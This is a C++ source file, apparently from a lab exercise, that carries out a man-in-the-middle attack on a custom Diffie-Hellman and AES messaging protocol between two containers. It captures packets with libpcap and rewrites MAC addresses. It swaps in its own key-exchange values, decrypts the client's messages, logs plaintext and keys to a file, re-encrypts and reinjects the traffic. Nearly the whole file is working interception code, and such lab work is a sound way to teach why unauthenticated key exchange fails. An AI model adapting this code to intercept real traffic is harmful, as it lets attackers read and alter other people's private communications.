//
// Created by bryandu on 22-6-27.
//
#include <iostream>
#include <cstdlib>
#include <cstring>
#include "mitm.h"
#include <unistd.h>
#include <fstream>
#include "netinet/ip.h"
#include "net/ethernet.h"
#include "netinet/tcp.h"
#include "DH.h"
#include "AES.h"

#define MAX 2048
using namespace std;
DiffieHellman client{}, server{};

int main(int argc, char *argv[]) {
    pcap_if_t *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_findalldevs(&dev,errbuf);
    while (dev->next!= nullptr){
        if (strncmp(reinterpret_cast<const char *>(dev->name), "br-eb7371315c7c", 15)==0){
            break;
        }
        dev = dev->next;
    }
    cout<<dev->name<<endl;
    if (argc != 3) {
        cout << "usage: ./DH_MITM client_ip server_ip" << endl;
        return 0;
    }
    daemon(1, 1);
    pcap_t *descr = nullptr;
    int i = 0, cnt = 0;
//    char errbuf[PCAP_ERRBUF_SIZE]; // 存放错误信息
    char *device = nullptr;           // 网络设备名指针
    bzero(errbuf, PCAP_ERRBUF_SIZE);
    struct bpf_program filter{};


    if ((descr = pcap_open_live(dev->name, MAX, 1, 512, errbuf)) == NULL) {
        fprintf(stderr, "ERROR at pcap_open_live(): %s\n", errbuf);
        exit(1);
    }
    char rule[128];
    memset(rule, 0, 128);
    strncat(rule, "(src host ", 10);
    strncat(rule, argv[1], strlen(argv[1])); // (src host ClientIP
    strncat(rule, " and dst host ", 14);
    strncat(rule, argv[2], strlen(argv[2])); // and dst host ServerIP
    strncat(rule, ") or (src host ", 15);
    strncat(rule, argv[2], strlen(argv[2])); // ) or ( src host ServerIP
    strncat(rule, " and dst host ", 14);
    strncat(rule, argv[1], strlen(argv[1])); // and dst host ClientIP
    strncat(rule, ")", 1);

    FILE *fp;
    fp = fopen("./middle.txt", "w");
    fputs("客户端IP: ", fp);
    fputs(argv[1], fp);
    fputs("\n服务器IP: ", fp);
    fputs(argv[2], fp);
    fputs("\n\n", fp);
    fclose(fp);

    if (pcap_compile(descr, &filter, rule, 1, 0) < 0) {
        fprintf(stderr, "ERROR at pcap_compile()\n");
        exit(1);
    }
    if (pcap_setfilter(descr, &filter) < 0) {
        fprintf(stderr, "ERROR at pcap_setfilter()\n");
        exit(1);
    }

    IP_T ip_t;
    ip_t.p = descr;
    bzero(ip_t.client_ip, 15);
    memcpy(ip_t.client_ip, argv[1], strlen(argv[1]));
    bzero(ip_t.server_ip, 15);
    memcpy(ip_t.server_ip, argv[2], strlen(argv[2]));

    if (pcap_loop(descr, -1, reinterpret_cast<pcap_handler>(process_pkt), (u_char *) &ip_t) == -1) {
        fprintf(stderr, "ERROR at pcap_loop()\n");
        exit(1);
    }
    return 0;
}

void process_pkt(IP_T *ip_t, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    unsigned char src_ip[16];
//    02:42:e2:94:da:a4
    unsigned char mitm_mac[] = {0x02, 0x42, 0x4b, 0x59, 0x97, 0x7b};
    unsigned char server_mac[] = {0x02, 0x42, 0xac, 0x15, 0x00, 0x02};
    unsigned char client_mac[] = {0x02, 0x42, 0xac, 0x15, 0x00, 0x03};

    struct ether_header *ethernet = (struct ether_header *) (packet); // 以太网帧头部
    struct iphdr *ip = (struct iphdr *) (packet + ETHER_HDR_LEN);     //IP头
    struct tcphdr *tcp = (struct tcphdr *) (packet + ETHER_HDR_LEN +
                                            sizeof(struct iphdr)); //tcp头
    int header_len = ETHER_HDR_LEN + sizeof(struct iphdr) +
                     sizeof(struct tcphdr); // 数据包头部长度
    int data_len = pkthdr->len - header_len;
    unsigned char plain[40];
    bzero(src_ip, 16);
    inet_ntop(AF_INET, &(ip->saddr), reinterpret_cast<char *>(src_ip), 16); // 源地址存入src_ip
    memcpy(ethernet->ether_shost, mitm_mac, 6); // 用中间人MAC替换源地址MAC
    ofstream fout;
    fout.open("./middle.txt",ios_base::out|ios_base::app);
//    FILE *fp;
//    fp = fopen("./middle.txt", "a");
    if (strncmp(reinterpret_cast<const char *>(src_ip), reinterpret_cast<const char *>(ip_t->client_ip), strlen(
            reinterpret_cast<const char *>(src_ip))) == 0) {
//        strncmp(reinterpret_cast<const char *>(packet + header_len), reinterpret_cast<const char *>(0x01), 1) ==
//        0
        unsigned char head = 0xff;
        unsigned char msg = 0xfb;

        if (memcmp((void *) (packet + header_len), &head, 1) == 0) {
            unsigned int mod_p, ex_key;
            memcpy(&ex_key, packet + header_len + 1, sizeof(unsigned int));
            memcpy(&mod_p, packet + header_len + 1 + sizeof(unsigned int), sizeof(unsigned int));
            unsigned int key = client.GenerateExKey(2, mod_p);
            fout<<"客户端模数："<<hex<<mod_p<<endl;
            fout<<"客户端公钥："<<hex<<ex_key<<endl;
            fout<<"中间人公钥-客户端："<<hex<<key<<endl;
            client.UpdateRecvKey(ex_key);
            client.GeneratePubKey();
            fout<<"客户端密钥："<<hex<<client.public_key<<endl;
            tuple<unsigned int, unsigned int> r = server.GenerateExKey();
            unsigned int trans_key = get<0>(r);
            unsigned int s_mod_p = get<1>(r);
            fout<<"中间人模数："<<hex<<s_mod_p<<endl;
            fout<<"中间人公钥-服务端："<<hex<<trans_key<<endl;
            memcpy((void *) (packet + header_len + 1), &trans_key, sizeof(unsigned int));
            memcpy((void *) (packet + header_len + 1 + sizeof(unsigned int)), &s_mod_p, sizeof(unsigned int));

        } else if (memcmp((void *) (packet + header_len), &msg, 1) == 0){
            uchar *buf = const_cast<unsigned char *>(packet + header_len + 1);
            bzero(plain, data_len);
            data_len = (data_len / 16) * 16;
            strncpy(reinterpret_cast<char *>(plain), reinterpret_cast<const char *>(buf), data_len);
            uchar client_key[16];
            for (int i = 0;i<4;i++) {
                memcpy(client_key+i*sizeof (unsigned int), &(client.public_key), sizeof(unsigned int));
            }
            AES dec(client_key);
            unsigned char *res = dec.Decrypt(plain, data_len);
            int length = plain[data_len-2];
            uchar text[length];
            memcpy(text,plain,length);
            text[length] = '\0';
            fout<<"c->s:"<<length<<" "<<text<<endl;

            uchar server_key[16];
            for (int i = 0;i<4;i++) {
                memcpy(server_key+i*sizeof (unsigned int), &(server.public_key), sizeof(unsigned int));
            }

            AES enc(server_key);
            pair<unsigned char *, int> r = enc.Encrypt(text, length);
            memcpy((void *) (packet + header_len + 1), r.first, r.second);

        }
        memcpy(ethernet->ether_dhost, server_mac, 6);
    } else if (strncmp(reinterpret_cast<const char *>(src_ip), reinterpret_cast<const char *>(ip_t->server_ip),
                       strlen(reinterpret_cast<const char *>(src_ip))) == 0) {
        unsigned char head = 0xfe;
        if (memcmp((void *) (packet + header_len), &head, 1) == 0){
            unsigned int recv_key;
            memcpy(&recv_key,packet+header_len+1,sizeof (unsigned int));
            server.UpdateRecvKey(recv_key);
            server.GeneratePubKey();
            fout<<"服务端密钥："<<hex<<server.public_key<<endl;
            unsigned int t_k = client.exchange_key;
            memcpy((void *) (packet + header_len + 1), &t_k, sizeof (unsigned int));

        }
        memcpy(ethernet->ether_dhost,client_mac,6);
    }
    uint16_t tcp_len = pkthdr->len - ETHER_HDR_LEN - sizeof(struct iphdr);
    unsigned char *data_for_checksum = (unsigned char *)malloc(
            tcp_len + sizeof(struct psd_header));
    struct psd_header ph;
    bzero(data_for_checksum, tcp_len + sizeof(ph));
    set_psd_header(&ph, ip, tcp_len);
    memcpy(data_for_checksum, (void *)(&ph), sizeof(ph));
    tcp->check = 0;
    memcpy(data_for_checksum + sizeof(ph), tcp, tcp_len);
    uint16_t checksum = calc_checksum(data_for_checksum, tcp_len + sizeof(ph));
    tcp->check = checksum;
    int res = pcap_sendpacket(ip_t->p,packet,pkthdr->len);
    fout.close();
}

uint16_t calc_checksum(void *pkt, int len) {
    // 将TCP伪首部、首部、数据部分划分成16位的一个个16进制数
    uint16_t *buf = (uint16_t *) pkt;
    // 将校验和置为0，设置为32bit是为了保留下来16bit计算溢出的位
    uint32_t checksum = 0;
    // 对16位的数逐个相加，溢出的位加在最低位上
    while (len > 1) {
        checksum += *buf++;
        // 前半部分将溢出的位移到最低位，后半部分去掉16bit加法溢出的位（置0）
        checksum = (checksum >> 16) + (checksum & 0xffff);
        len -= 2;
    }
    if (len) {
        checksum += *((uint8_t *) buf); // 加上最后8位
        checksum = (checksum >> 16) + (checksum & 0xffff);
    }
    return (uint16_t) ((~checksum) & 0xffff); // 取反
}

// 设置TCP数据包头部
void set_psd_header(struct psd_header *ph, struct iphdr *ip, uint16_t tcp_len) {
    ph->saddr = ip->saddr;
    ph->daddr = ip->daddr;
    ph->must_be_zero = 0;
    ph->protocol = 6; // 6表示TCP
    ph->tcp_len = htons(tcp_len);
}